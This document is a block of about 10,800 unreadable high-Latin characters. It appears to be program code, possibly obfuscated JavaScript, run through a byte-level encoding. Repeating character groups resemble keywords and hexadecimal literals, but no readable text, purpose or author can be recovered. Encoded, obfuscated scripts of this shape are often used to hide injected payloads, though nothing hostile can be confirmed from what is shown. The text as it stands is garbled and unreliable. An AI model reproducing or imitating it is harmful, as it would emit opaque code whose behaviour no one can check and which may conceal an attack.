ùª±ª¬·°¹ùöî¦ï¸ë¿ôóî¦ïõóî¦ìëºçõî¦ïïôî¦êïí÷÷ù­²·½»ùöóöî¦ï¼¼¼õî¦ìôóî¦¸ëçõî¦ïôî¦ì¸ç÷÷å£¬»ª«¬°þº»½±º»±³®±°»°ªö¶÷å£å½±°­ªþã¸«°½ª·±°ö¯ò÷¥²»ªþ¸ãò¶ãî¦¸ôóî¦ïêïõî¦ïêé¿õóî¦ï¿¼òòãùùå¯ãö¯÷å²»ªþ°å¸±¬ö°ãî¦ïì¸æõóî¦æìæõóî¦¿ºîå°âî¦ïæï¼õî¦èïèõî¦ïôóî¦ïºíïå°õõ÷¥¸°ã°å£¸±¬ö°ãî¦ºîºõî¦ï¿êºôî¦ïõóî¦ìôî¦ïí¿ºå°âî¦¿íæõóî¦éôî¦ïº¸õî¦ïê¼ôî¦íå°õõ÷¥¶ãö¶õ¸°õù½¶¿¬±º»ªùö°ûù²»°¹ª¶ù÷÷ûöî¦½»íõóî¦¸ëõóî¦¿»»÷òã¸°ò¸°ã¸¶ò¸¶ãå£°ãî¦ï¿ôî¦»íõóî¦ïëï¸õóî¦ï»¸ò¶ãî¦ìèèïõî¦ïôî¦ï¸½¸õóî¦êèíîå¸±¬ö²»ªþ¤ãî¦ïôóî¦¼¿¼õóî¦éíëõî¦ìîôî¦çéå¤â¯ù²»°¹ª¶ùå¤õõ÷¥°ãö°õöóî¦ïê½¼õóî¦èºéôóî¦ìõî¦ïôî¦éï»÷÷ûöóî¦ïôóî¦ç¸¸õî¦ïôî¦ºíæõóî¦ïèíé÷ò¶ãö¶õ¸°÷ûöóî¦ïôî¦»éèõóî¦½ççôî¦íõî¦íëêï÷òã¸°ò¸°ã¸¶ò¸¶ãòõãª¬·°¹ù¸¬±³¶¿¬±º»ùö¯ù½¶¿¬±º»ªùö¤÷¸ö¸°õ¸¶÷ûöî¦ï¿½íõóî¦ï¸îëõî¦ëêì÷÷å£¬»ª«¬°þå£åù¤ªùãòù®ªùã¥£òù¬ùãÿÿå£½±°­ªþãî¦ïôî¦ìîíæõóî¦ìííôóî¦ïïõóî¦êëç¼ò©ã³õòªãù®ªù©å¬»ª«¬°ÿªáöù¹ºùããã«°º»¸·°»ºøøöù¹ºùãÿÿ÷òãù¤ªùöò÷òù®ªù©ã÷äãªòå£½±°­ªþ°¿³»¿½¶»ã°»©þ¿®ö÷ò­ª¬·®»¨·½»ã³ãà¥½±°­ªþºã¿å·¸öÿ³÷¬»ª«¬°þ°«²²å¬»ª«¬°þ³ºöî¦æèìòùî½ù÷öñäîóçõñòùù÷å£ò·­·ºã³ãà±±²»¿°ö³øø³¿öî¦í»îòùî³íù÷ö¿öî¦íº¼òù«¹¤ù÷÷÷ò¬»­±²¨»»¿²·ºã¿­§°½ö³òò÷ãà¥½±°­ªþã¿òã¥ù±½³»ùäöî¦éêçòùç®ù÷òù±´ùäöî¦è¿éòùù÷òù­½«´ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å£òùªùä¸«°½ª·±°öò©÷¥¬»ª«¬°þããã©å£òù³¤ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å£òùº¤¼ùäöî¦êêëòùì±ù÷õöî¦ê¿éòù®ù÷òù¶¬¨ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å£òùµ½§ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þÿãã©å£òù·¤¸ùäöî¦ì¼¼òù´ºù÷òùµ¶©¹ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å£òù¸¼²ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å££å·¸öÿ÷¬»ª«¬°þ°«²²å½±°­ªþãöî¦º¸òù¦±ù÷ö­ª¬·®»¨·½»ò÷å·¸öøøöî¦êêçòùé¸ù÷ööî¦ïëæòù·¼ïù÷÷÷¬»ª«¬°þå·¸ööî¦êæ»òù¬ù÷ö·­·ºò÷øøøøöî¦ºçòù´ºù÷ö·­¬±«®ò÷÷¥·¸ööî¦èºæòùî½ù÷ööî¦éëêòùÿéù÷òöî¦í¿ëòù§ç¶ù÷÷÷ãöî¦ìçêòùé¸ù÷òãöî¦êæïòùù÷áðöî¦æ»çòùî³íù÷õù¹»ùáðöî¦ìçæòùé´ù÷¢¢öî¦ïî¿òù­¦êù÷å»²­»þª¬§¥½±°­ªþ©ã¿©¿·ªþ³öî¦ïºèòùµýù÷õöî¦»»òùî½ù÷ö÷òªã©öî¦ëéíòù°ù÷õùª­ùöî¦íëëòùìù÷öãà¥½±°­ªþãò¯ãöî¦í»æòù·êù÷ö­ª¬·®»¨·½»òöî¦éëïòùµ³ïù÷¢¢ùù÷òãöî¦í½ìòùé´ù÷ö­ª¬·®»¨·½»òù·ºù¢¢ùù÷å¬»ª«¬°þöî¦éîîòùì±ù÷ö¯ò÷¢¢öî¦ïíìòùù÷öò÷å£÷å·¸öªøøªù·ºù÷¬»ª«¬°þöî¦ç½èòùµýù÷ö­ª¬·®»¨·½»òªù·ºù÷å£½¿ª½¶ö÷¥££·¸ööî¦æíêòùìù÷ö·­·ºò÷÷¬»ª«¬°þ°«²²å¬»ª«¬°þå£ò½¿½¶»¿³»ãö³ò÷ãà¥½±°­ªþ¦ã¿òã¥ù¶¿ùä¸«°½ª·±°öò÷¥¬»ª«¬°þ¢¢å£òù©³©§ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¨ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å££å·¸ö¦öî¦ç¿ºòùù÷öÿ³òÿ÷÷¬»ª«¬°å½±°­ªþã¦öî¦ïëºòù´ºù÷ö­ª¬·®»¨·½»ò³÷å·¸öøøÿ¦öî¦ìíéòù®ù÷ö·­·ºò÷÷°¿³»¿½¶»¦öî¦ééºòùµýù÷öò÷å£ò¬»­±²¨»»¬­±°ã¿­§°½öòòòã°«²²÷ãà¥½±°­ªþã¿òã¥ù·µ«¼»ùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸õ¶å£òù­¨´ºùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸õ¶å£òù³ª«ùäöî¦èéëòùê©¯ù÷òù¯¨ùäöî¦ìºéòùî½ù÷òùµ¿ùäöî¦í½æòù°ù÷òù®ùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸ããã¶å£òù«¹ùäöî¦ííìòù°ù÷òù°¬²ùäöî¦ç½»òù¶ªëù÷òùº§ùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸ö¶÷å£òù¦½ùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸ö¶÷å£òù¨°º§ùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸¢¢¶å£òùºµ²ùä¸«°½ª·±°ö¸ò¶òò÷¥¬»ª«¬°þ¸ö¶òò÷å£òù·µ¶ùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸øø¶å£òù¯ªùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸ö¶÷å£òù½¯¸²½ùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸ããã¶å£òù®´¦ùäöî¦í½èòù½«ù÷òù¦©·§ùäöî¦êì»òù¨§ù÷òù©¼ùä¸«°½ª·±°ö¸ò¶ò÷¥¬»ª«¬°þ¸ö¶ò÷å£òùº²¦³»ùä¸«°½ª·±°ö¸ò¶÷¥¬»ª«¬°þ¸øø¶å£òù®ùäöî¦íêïòùéÿ­ù÷õöî¦è¼îòùéÿ­ù÷£å·¸öÿ÷¬»ª«¬°¥ù°¿³»ùäöî¦ë¼ìòùôëù÷öò°«²²÷òù¬»¿²·ºùä°«²²òù°«³ùä°«²²£å½±°­ªþ©ãöî¦ï¼¸òùé´ù÷ö­ª¬·®»¨·½»ò÷å²»ªþªã¿©¿·ªþöî¦é¸ëòù±ëù÷ö¬»­±²¨»»¿²·ºòò©ò÷òãªá°¿³»¿½¶»öî¦çíéòùù÷öª÷ä°«²²å·¸ööî¦ììçòùæù÷öÿò÷øøöî¦éí»òù¦µù÷ö·­¬±«®ò÷÷¥·¸ööî¦ïæîòùºëèù÷ööî¦í¸ïòùë¼ù÷òöî¦ìì¸òù¶ªëù÷÷÷¥½±°­ªþãù·ºùò°ãöî¦íçìòùæù÷å¸±¬ö½±°­ªþ¤þ±¸þöî¦êîîòùµ³ïù÷ö°÷÷¥öî¦ê½èòù±ëù÷ööî¦èèëòùµ³ïù÷ööî¦ëçèòù·êù÷ööî¦êê¸òù«¹¤ù÷ööî¦éºíòùé¸ù÷ööî¦ìêêòùë¼ù÷ööî¦èîæòù§ç¶ù÷ò¤÷òöî¦êíêòù¤û»ù÷÷ò÷òùä¦ìîù÷ò°¤öî¦èèéòùì±ù÷õöî¦è»îòùù÷÷÷å££»²­»þª¬§¥½±°­ªþ¶ã¿©¿·ªþöî¦é¼¸òù¦µù÷õöî¦éº¸òù¬ù÷ö÷òã¶öî¦»ºòùîù÷õùª­ùöî¦êïæòùæù÷öãà¥½±°­ªþãò°ã¥£å°öî¦êé¿òù°ù÷ãöî¦è¸îòù³ù÷å½±°­ªþ¤ã°å·¸ööî¦è¸ëòùºëèù÷ööî¦éî¼òùµýù÷òöî¦êé¼òùé¸ù÷÷÷¥½±°­ªþ½ã¥£å½öî¦ìº¸òù°ç¬ù÷ãªò½öî¦é¸¸òù´ºù÷ãò½öî¦ëè¿òùôûù÷ã¯öî¦ïîìòù÷¬û½ù÷¢¢¤öî¦ìéçòùë¼ù÷ò½öî¦èëïòù·¼ïù÷ãò½öî¦ïêéòù³ù÷ã¸ò½öî¦ë½¿òùì±ù÷ãÿò©öî¦ï¸ïòù¦±ù÷ö½÷å£»²­»¥½±°­ªþ½ãöî¦æ¸çòù§ç¶ù÷ö­ª¬·®»¨·½»òù·ºù¢¢ùù÷ò¿ãöî¦æëçòù­¦êù÷ö­ª¬·®»¨·½»òöî¦êèæòùêïù÷¢¢ùù÷å¬»ª«¬°þöî¦çîéòùé¸ù÷ö½òöî¦ïëïòù½«ù÷öªò©÷÷¢¢öî¦ê½éòùî³íù÷ö¿ò©÷å££÷å·¸ö÷¥·¸öÿªøøù·ºù÷ªãöî¦ë¿èòùµ³ïù÷ö­ª¬·®»¨·½»òù·ºù÷åãöî¦ìºèòùôûù÷¢¢öî¦æîïòù¸èù÷¢¢°«²²å·¸ööî¦æëêòù§ç¶ù÷öòª÷÷öî¦êïìòùé¸ù÷ö½¿½¶»¿³»òªò÷å££½¿ª½¶ö÷¥££·¸ööî¦é¿æòùî½ù÷öÿò÷÷ãå½±°­ªþ¯ãªáªöî¦ïêêòùôûù÷ööî¦ïæêòùôëù÷òùù÷ä°«²²òã¥£å¬»ª«¬°þöî¦éçèòù®ù÷ãòöî¦íèîòùôëù÷ãªòöî¦è¿ïòù¦µù÷ã¯òå£ò®»¬­±°·°»ããà¥½±°­ªþ¼ã¿òã¥£å¼öî¦ê¼íòùéÿ­ù÷ã¸«°½ª·±°öò÷¥¬»ª«¬°þõå£ò¼öî¦çç½òù¸é¶ù÷ã¸«°½ª·±°öò÷¥¬»ª«¬°þõå£ò¼öî¦íë¿òù÷¬û½ù÷ã¼öî¦é¸éòù²êöêù÷ò¼öî¦ëè»òù±ëù÷ã¸«°½ª·±°öò÷¥¬»ª«¬°þõå£ò¼öî¦çëíòù½«ù÷ã¼öî¦ææ»òùî½ù÷å½±°­ªþãå·¸ö¼öî¦íïæòùù÷øø¼öî¦éæ¸òù¹½ù÷÷¬»ª«¬°þ¼öî¦éêíòù­¦êù÷ö¼öî¦ëî¸òù¿³½éù÷ö¼öî¦ë¼¿òù«¹¤ù÷öùôùò¼öî¦ê¿ïòù÷¬û½ù÷÷ò¼öî¦èë¼òù«¹¤ù÷÷ò¼öî¦ç»æòù±ëù÷÷å·¸ö¼öî¦ëºëòù¨§ù÷÷¬»ª«¬°þ¼öî¦çî»òù¨§ù÷öùùò¼öî¦êèïòùµýù÷÷å·¸ö¼öî¦ï¿¼òùµýù÷÷¬»ª«¬°þ¼öî¦ê¼îòùµ¤¼ûù÷ö¼öî¦ìèçòùµýù÷öùôùò¼öî¦éêæòù«¹¤ù÷÷òùôù÷å¬»ª«¬°þ¼öî¦çêêòù¤û»ù÷å£ò·°½±®»ãöò÷ãà¥½±°­ªþã¿òã¥£åöî¦éïæòùî½ù÷ãöî¦ïé¼òùé¸ù÷òöî¦ïèìòù·¼ïù÷ã¸«°½ª·±°öªò÷¥¬»ª«¬°þªãããå£òöî¦æ»èòù¶ªëù÷ãöî¦í¸¸òùºëèù÷òöî¦íèëòù÷¬û½ù÷ãöî¦½¿òùºëèù÷òöî¦í¼íòùµ³ïù÷ãöî¦èéíòùê©¯ù÷òöî¦êçìòù¬ù÷ã¸«°½ª·±°öªò÷¥¬»ª«¬°þªãããå£òöî¦í½½òù¶ªëù÷ãöî¦æ¸èòùë¼ù÷å½±°­ªþãòãöî¦ííïòù¦±ù÷öî¦ëëèòù«¹¤ù÷öù¢ù÷å²»ªþ©ãóî¦ëôóî¦íïëõóî¦ê¿»ôóî¦ïõóî¦ïêïéå©¶·²»öÿÿ÷¥­©·ª½¶ö©õõ÷¥½¿­»ùîùä·¸ööî¦ç¼¼òùì±ù÷öòöî¦èçìòùî½ù÷÷÷¬»ª«¬°þå½±°ª·°«»å½¿­»ùïùä·¸öÿ¢¢öî¦ìíìòù¶ªëù÷öòöî¦æ¼ºòùîù÷÷¢¢öî¦ê½çòùêïù÷öòÿ÷÷¬»ª«¬°ÿå½±°ª·°«»å½¿­»ùìùä·¸ööî¦çç¼òù«¹¤ù÷öòÿÿ÷¢¢öî¦êæîòù¨§ù÷öòöî¦è¿èòù±ëù÷÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùíùä¬»ª«¬°ÿå½¿­»ùêùä·¸ööî¦ï¿ºòù«¹¤ù÷öòöî¦ëæ¸òùéÿ­ù÷÷÷¬»ª«¬°ÿå½±°ª·°«»å£¼¬»¿µå££ò¬«°¬»­»°½»²»¦ãö³òò÷ãà¥½±°­ªþ¬ã¿òã¥ùª¨¤·³ùä¬öî¦æê»òùù÷òù¼¬°±ùä¬öî¦é¿íòù­¦êù÷òùª§¶¼»ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªÿããå£òù³ùä¬öî¦íï¼òùôëù÷õùîæùòù¬°®ùä¸«°½ª·±°öªòò¯÷¥¬»ª«¬°þªöò¯÷å£òùºª·ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªö÷å£òù¶±ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þª¢¢å£òù´¶ùä¬öî¦éæïòùµ³ïù÷òù¸®ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªãããå£òù½²²ùä¬öî¦ææºòùê©¯ù÷òùµ¨½ùä¬öî¦ëï¼òù¹½ù÷òù¸¿³ùä¬öî¦ëééòùìù÷òù­·¤ùä¬öî¦æ¸¸òùºëèù÷òù¨ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªãããå£òù¹ùä¬öî¦çæèòù¸èù÷òù©´ùä¬öî¦êêîòùôëù÷òù·¼¯ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªõå£òù¬«º±ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªôå£òù¶ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªóå£òùµ¦ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªâå£òù¹¿ùä¬öî¦ëê¼òùêïù÷òù²¼ªùä¬öî¦ç¿êòù½«ù÷òù½ººùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªãããå£òù»ùä¬öî¦ìéîòùîù÷òùª«ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªõå£òù²ùä¬öî¦çîèòù¿³½éù÷õ¬öî¦é¿ºòù¦µù÷õ¬öî¦èæïòù·¼ïù÷òùµ®ùä¬öî¦ëººòùôëù÷õ¬öî¦ïæ¸òùî½ù÷òù®ùä¬öî¦ììéòù®ù÷òù«¹ùä¬öî¦æé¸òùç®ù÷òù¦¿¯ùä¬öî¦ë½½òù¦µù÷òù¬´ùä¬öî¦ìèîòùî³íù÷òù«»¨´®ùä¬öî¦íé½òù¸èù÷òùº¹¼ªùä¬öî¦ìºêòùë¼ù÷òù¯¼¼ùä¬öî¦æí»òù¦±ù÷òù½ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªÿãå£òù¦ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªÿãå£òù³°ùä¬öî¦çéëòù¨§ù÷òùº±·ùä¸«°½ª·±°öªò÷¥¬»ª«¬°þªãããå£òù®ùä¬öî¦ï¼ëòù¤û»ù÷òùºùä¸«°½ª·±°öªòò¯÷¥¬»ª«¬°þªöò¯÷å££òã¬öî¦æ¼æòùµ³ïù÷ö½±°¸·¹¬öî¦íçíòù«®³ù÷õ¬öî¦ïºæòùéÿ­ù÷ò°«²²÷á½±°¸·¹¬öî¦ëëíòù±ëù÷õ¬öî¦ê½æòùµ¤¼ûù÷ä¬öî¦¼êòù¸é¶ù÷öº»¸¿«²ª­¬öî¦íæëòùù÷õ¬öî¦í¼¿òù­¤ù÷ò°«²²÷áº»¸¿«²ª­¬öî¦è»ºòùµýù÷õ¬öî¦ì»îòùæù÷ä¬öî¦ìéèòùµýù÷òã¬öî¦ëèéòùìù÷ö½±°¸·¹¬öî¦çéíòùºëèù÷ò°«²²÷á½±°¸·¹¬öî¦ï½çòùìù÷ä¬öî¦ïíïòùµýù÷öº»¸¿«²ª­¬öî¦èí¸òù°ù÷ò°«²²÷áº»¸¿«²ª­¬öî¦êºëòù½«ù÷ä¬öî¦æêîòùìù÷ò©ã¬öî¦éçïòùé´ù÷ö½±°¸·¹¬öî¦çì»òùù÷ò°«²²÷á½±°¸·¹¬öî¦íìæòù­¦êù÷ä¬öî¦ìº»òùæù÷öº»¸¿«²ª­¬öî¦ëæ¼òù°ù÷ò°«²²÷áº»¸¿«²ª­¬öî¦è½æòùºëèù÷ä¬öî¦ï¼»òù­¦êù÷å·¸ö¬öî¦æë¸òù¦±ù÷ö·°½±®»òò÷÷¥·¸ö¬öî¦éææòù¶ªëù÷ö¬öî¦ê»îòù¿³½éù÷ò¬öî¦ë»ëòùîù÷÷÷¥¬öî¦íæèòùµ³ïù÷ö­»ª³³»º·¿ª»ò¿­§°½ö÷ãà¥½±°­ªþã¬òªã¥ù½ºùä¸«°½ª·±°öò¯÷¥½±°­ªþ­ãå¬»ª«¬°þ­öî¦ê½¿òùî½ù÷öò¯÷å£òù§­ùäöî¦çºëòùîù÷òù¶½ùä¸«°½ª·±°öò¯ò÷¥½±°­ªþ¨ãå¬»ª«¬°þ¨öî¦ìé¸òù³ù÷öò¯ò÷å£òù¦²ùä¸«°½ª·±°öò¯÷¥½±°­ªþãå¬»ª«¬°þöî¦èï¿òù½«ù÷öò¯÷å£òù±´¶ùä¸«°½ª·±°öò¯÷¥½±°­ªþãå¬»ª«¬°þöî¦çæéòù«®³ù÷öò¯÷å£òù´¸ùäöî¦¸½òù¬ù÷òù«ºùä¸«°½ª·±°öò¯÷¥½±°­ªþ²ãå¬»ª«¬°þ²öî¦ç¼¸òù¿³½éù÷öò¯÷å£òù¹µùäöî¦é¸íòù¿³½éù÷òùª«¹ùä¸«°½ª·±°öò¯÷¥½±°­ªþ¹ãå¬»ª«¬°þ¹öî¦ï»íòù¶ªëù÷öò¯÷å£òù³±¨ùäöî¦æëëòùôëù÷òù²ùäöî¦ì¸¿òù«®³ù÷£å·¸ööî¦çïæòù³ù÷ööî¦ïêçòù«®³ù÷òöî¦ëëºòùù÷÷÷ª¬§¥·¸ööî¦é½»òùî½ù÷ööî¦ï¼¿òùµýù÷òöî¦éæèòùµ¤¼ûù÷÷÷¥·¸öÿøøªöî¦è»íòù¶ªëù÷ö°òªöî¦íéçòù®ù÷÷øøªöî¦èº¸òù¦µù÷ö¤òò½÷÷¬»ª«¬°ÿå½±°­ªþ¯ãªöî¦íîïòù¦µù÷ö¿òªöî¦ïç»òù«®³ù÷öòªöî¦íîêòù¸èù÷÷÷öî¦çî¼òùµýù÷õù»ùö÷òãªöî¦ëêîòùêïù÷ö´òºò÷¢¢¢¢ªöî¦ëìçòù±ëù÷ö¦òªöî¦ë¼ïòùîù÷÷å·¸ö÷¬»ª«¬°ÿÿå·¸öªöî¦ç¿ïòù¦±ù÷ö¯òªöî¦êçïòù´ºù÷÷÷¬»ª«¬°ÿå·¸öªöî¦êº¼òù÷¬û½ù÷ö¯òªöî¦ìéºòù°ç¬ù÷÷÷¬»ª«¬°ÿå·¸öªöî¦½½òù¿³½éù÷ö¯òªöî¦íì¸òù°ç¬ù÷÷÷¬»ª«¬°þå¬»ª«¬°ÿÿå£»²­»¥½±°­ªþ¯ãî¦éìôî¦èºõî¦íëïçõóî¦ê¿ê¼òãöî¦ï¼íòù¨§ù÷ö¿ª¶öî¦ç¼¿òù¤û»ù÷ööî¦ï¸½òù¶ªëù÷ö¿ª¶öî¦é¿»òù¦±ù÷ö÷òî¦ïì½íõî¦¼æõî¦º÷÷òóî¦º½îõî¦ïè¼»õî¦í»ôóî¦ïë÷ò¸ãöî¦éíçòùî½ù÷ö¯ò÷ò¶ãöî¦ï»¿òùù÷ö¿ª¶öî¦ììïòùæù÷ö÷òóî¦íêôî¦ëèõî¦ïïôî¦ìïêõóî¦ïïº½õîðë÷áöî¦íæ¿òùêïù÷äöî¦íë¸òù¸èù÷òãöî¦è¸¸òù¦±ù÷ö¶òöî¦ìï»òù§ç¶ù÷÷áöî¦ê¿»òùç®ù÷äöî¦æ»½òù±ëù÷å¿©¿·ªþ³öî¦çíëòù­¦êù÷õöî¦ë¼îòù«®³ù÷ö¶ò÷ò¿©¿·ªþ°»©þ¬±³·­»öãà­»ª·³»±«ªöò÷÷ò¿©¿·ªþ³öî¦æ¿ìòù²êöêù÷õöî¦ëííòùù÷öò÷ò¿©¿·ªþ°»©þ¬±³·­»öãà­»ª·³»±«ªöò¸÷÷ò¿©¿·ªþ³öî¦ê½ïòù¬ù÷õöî¦ë½æòùµýù÷ööî¦¼éòùìù÷ò÷å££½¿ª½¶ö÷¥£»²­»þãöî¦ì»éòùæù÷òãöî¦çï¿òùæù÷áðöî¦í¸éòù¿³½éù÷õù¹»ùáðöî¦éë¿òùù÷¢¢öî¦æçêòùî³íù÷å£÷å¬»ª«¬°å£»²­»þ¬öî¦ééìòùºëèù÷ö¬öî¦ëèºòù­¦êù÷÷å£·¸ö¬öî¦ïê¼òù«¹¤ù÷ö·°½±®»òò÷÷¥¬öî¦ëêèòùµ¤¼ûù÷ö­»ª³³»º·¿ª»ò¿­§°½ö÷ãà¥½±°­ªþã¬òã¥£åöî¦èê¸òùê©¯ù÷ãöî¦ì¿çòù·¼ïù÷å½±°­ªþ¯ãå·¸ööî¦éíéòù¤û»ù÷ööî¦ë»ìòù¤û»ù÷òöî¦ëº»òù¨§ù÷÷÷¥½±°­ªþ¸ã©öî¦í¸ëòù°ù÷øøªöî¦ì¿¼òùìù÷ù·ºùáöî¦æêºòùµýù÷ù·ºùäùùå¯ã¸öî¦æçïòùµ³ïù÷öñäîóçõñòùù÷å·¸öÿöî¦æ¼¸òùôûù÷öùù÷÷¸õã¯öî¦çïëòùé¸ù÷å£»²­»þª¬§¥öî¦íê»òùê©¯ù÷ööî¦èºëòù¶ªëù÷òöî¦èééòù·¼ïù÷÷áöî¦éìæòùæù÷ööî¦ëìêòù´ºù÷ööî¦í¿èòù°ù÷òöî¦í¿ïòù÷¬û½ù÷÷÷äö¿©¿·ªþ³öî¦ë¸êòù´ºù÷õöî¦ë»½òùôëù÷ööî¦¸çòù°ù÷ò÷ò¿©¿·ªþ°»©þ¬±³·­»ö¶ãà­»ª·³»±«ªö¶òî¦ì¼ôî¦è»õî¦ïºæìõóî¦ï½éê÷÷ò¿©¿·ªþ³öî¦ìèìòù÷¬û½ù÷õöî¦ëì¼òùî½ù÷ööî¦æºëòù°ç¬ù÷ò÷÷å£½¿ª½¶ö¶÷¥££÷å¬»ª«¬°å£¬öî¦ìï¸òùì±ù÷ö·°½±®»ò©ò÷øø¬öî¦ì¼îòùù÷ö­»ª³³»º·¿ª»ò¿­§°½ö÷ãà¥½±°­ªþµã¬òã¥£åµöî¦éçìòù¤û»ù÷ãµöî¦ê»çòù°ç¬ù÷å½±°­ªþ¯ãå·¸öµöî¦çëºòù§ç¶ù÷öµöî¦éçéòù«¹¤ù÷òµöî¦ïííòù°ù÷÷÷¥·¸öÿµöî¦çè¸òù°ç¬ù÷ö©÷÷¬»ª«¬°å¬»ª«¬°þªµöî¦ï¼êòùé´ù÷öµöî¦ëê½òù¶ªëù÷õù°½ùö¯ò¯µöî¦ï¿»òùôëù÷÷÷å£»²­»þª¬§¥¿©¿·ªþ³µöî¦ìèìòù÷¬û½ù÷õµöî¦ïéíòù¸èù÷öµöî¦èêîòùîù÷ò÷ò¿©¿·ªþ°»©þ¬±³·­»ö¸ãà­»ª·³»±«ªö¸òóî¦ëíôî¦ëºõóî¦ïìë»õî¦êêîºôî¦ï÷÷ò¿©¿·ªþ³µöî¦ë»éòùç®ù÷õµöî¦ëííòùù÷öµöî¦ëé»òù¸èù÷ò÷å£½¿ª½¶ö¸÷¥££÷å£ò·­±¬»¸·¦±º»ãö÷ãà¥½±°­ªþã¿òã¥£åöî¦ëíêòùµýù÷ã¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òöî¦ï¿îòù¬ù÷ãöî¦çæêòù«®³ù÷òöî¦ìí¸òùì±ù÷ã¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£å½±°­ªþãòã½±°¸·¹öî¦èéèòùê©¯ù÷¢¢º»¸¿«²ª­öî¦ççèòù¸èù÷¢¢ùðùå¬»ª«¬°þöî¦çìêòù´ºù÷öòöî¦ºìòù®ù÷÷¢¢öî¦è¿ìòùç®ù÷öòùù÷å£ò·­©°»¬ã³ãà¥½±°­ªþ®ã¿òã¥ù¦ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù©´´¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å££òãö½±°¸·¹®öî¦ìç½òùìù÷õù¬ù¢¢º»¸¿«²ª­®öî¦ëèîòùê©¯ù÷õù¬ù¢¢ùù÷®öî¦æ½æòùù÷ö÷å·¸öÿ÷¬»ª«¬°ÿå¬»ª«¬°þ®öî¦ì¿íòù·êù÷ö®öî¦ï½éòù®ù÷ö´·º±«³ò³÷ò÷å£ò·­«º±ãö³òã°«²²÷ãà¥½±°­ªþ§ã¿òã¥ùª©§ùä§öî¦ïëîòùì±ù÷õùîùòù°³¨¹ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å£òù¿­¼ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þÿãã©å£òùµ¿¼¦ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þÿãã©å£òù¿ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å££òã§öî¦ëëïòùîù÷§öî¦ë¸çòùºëèù÷öù¢ù÷å²»ªþãóî¦êôî¦ììõî¦èíºôóî¦ïõî¦è½ëå©¶·²»öÿÿ÷¥­©·ª½¶öõõ÷¥½¿­»ùîùä¬»ª«¬°ÿå½¿­»ùïùä·¸ö§öî¦ëºïòùù÷ö³¿ª½¶«º±ò³÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùìùä·¸ö§öî¦ë¸ºòùîù÷öòÿÿ÷øø§öî¦éíîòù·¼ïù÷ö³¿ª½¶«º±ò³÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùíùä·¸ö§öî¦çç¸òùç®ù÷öòÿ÷øø§öî¦ç¼îòù³ù÷ö³¿ª½¶«º±ò³÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùêùä·¸ö§öî¦ææîòùç®ù÷ö·­©°»¬ò³÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùëùä·¸öÿ³÷¬»ª«¬°ÿå½±°ª·°«»å£¼¬»¿µå££ò·­¿°°»ºãö³òã°«²²÷ãà¥½±°­ªþ±ã¿òã¥ù·¸§ùä±öî¦ê¿æòù°ù÷òùµª­ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þããã©å£òù²¨ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å£òù¦²»§ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þããã©å£òù®ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å££òã±öî¦ìïèòùé´ù÷±öî¦ë¼ºòùÿéù÷öù¢ù÷å²»ªþãî¦ï»ç¸õóî¦ìêé»õóî¦¿éôóî¦çå©¶·²»öÿÿ÷¥­©·ª½¶öõõ÷¥½¿­»ùîùä·¸ö±öî¦æºîòùôûù÷öòÿ÷øø±öî¦èëìòù÷¬û½ù÷ö³¿ª½¶¿°ò³÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùïùä·¸ö±öî¦ï¸¿òùë¼ù÷ö³¿ª½¶¿°°»ºò³÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùìùä¬»ª«¬°ÿå½¿­»ùíùä·¸ö±öî¦ëççòù¶ªëù÷öòÿÿ÷øø±öî¦¼æòùì±ù÷ö³¿ª½¶¿°ò³÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùêùä·¸öÿ³÷¬»ª«¬°ÿ